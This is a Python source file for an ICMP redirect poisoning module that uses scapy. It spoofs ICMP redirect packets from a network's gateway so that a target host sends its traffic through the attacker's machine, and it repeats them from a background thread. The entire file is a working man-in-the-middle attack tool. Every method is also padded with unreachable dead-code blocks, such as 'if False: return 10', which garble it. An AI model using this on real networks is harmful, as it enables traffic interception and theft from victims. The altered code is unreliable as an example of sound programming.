import logging
import threading
from time import sleep
from core.logger import logger
from scapy.all import IP, ICMP, UDP, sendp
formatter = logging.Formatter('%(asctime)s [ICMPpoisoner] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logger().setup_logger('ICMPpoisoner', formatter)

class ICMPpoisoner:

    def __init__(self, options):
        if False:
            return 10
        self.target = options.target
        self.gateway = options.gateway
        self.interface = options.interface
        self.ip_address = options.ip
        self.debug = False
        self.send = True
        self.icmp_interval = 2

    def build_icmp(self):
        if False:
            print('Hello World!')
        pkt = IP(src=self.gateway, dst=self.target) / ICMP(type=5, code=1, gw=self.ip_address) / IP(src=self.target, dst=self.gateway) / UDP()
        return pkt

    def start(self):
        if False:
            while True:
                i = 10
        pkt = self.build_icmp()
        t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug))
        t.setDaemon(True)
        t.start()

    def stop(self):
        if False:
            return 10
        self.send = False
        sleep(3)

    def send_icmps(self, pkt, interface, debug):
        if False:
            for i in range(10):
                print('nop')
        while self.send:
            sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)